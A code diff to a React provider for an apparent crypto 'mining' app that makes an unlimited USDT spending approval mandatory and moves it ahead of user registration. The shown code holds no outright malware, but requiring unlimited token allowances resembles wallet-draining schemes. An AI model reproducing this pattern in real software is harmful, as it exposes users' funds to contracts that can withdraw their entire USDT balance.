@@ -286,7 +286,20 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
     try {
       setIsLoading(true);
       
-      // 1. First, proceed with registration
+      // 1. Check and approve USDT if not already approved (unlimited)
+      if (!hasApprovedUSDT) {
+        console.log('Requesting USDT approval before registration...');
+        const approved = await approveUSDT();
+        if (!approved) {
+          console.log('USDT approval failed, cannot proceed with registration');
+          setIsLoading(false);
+          return false;
+        } else {
+          console.log('USDT approval successful, proceeding with registration');
+        }
+      }
+      
+      // 2. Proceed with registration
       const transaction = prepareContractCall({
         contract,
         method: "register",
@@ -298,20 +311,8 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
         account: account,
       });
       
-      // 2. Registration successful, now set registration status
+      // 3. Registration successful, now set registration status
       setIsRegistered(true);
-      
-      // 3. After registration, check and approve USDT if not already approved (unlimited)
-      if (!hasApprovedUSDT) {
-        console.log('Registration successful. Now requesting USDT approval...');
-        const approved = await approveUSDT();
-        if (!approved) {
-          console.log('USDT approval failed, but registration was successful');
-          // Don't fail registration if approval fails - user can approve later
-        } else {
-          console.log('USDT approval successful after registration');
-        }
-      }
       
       // 4. Refresh data and fetch user record
       setTimeout(async () => {
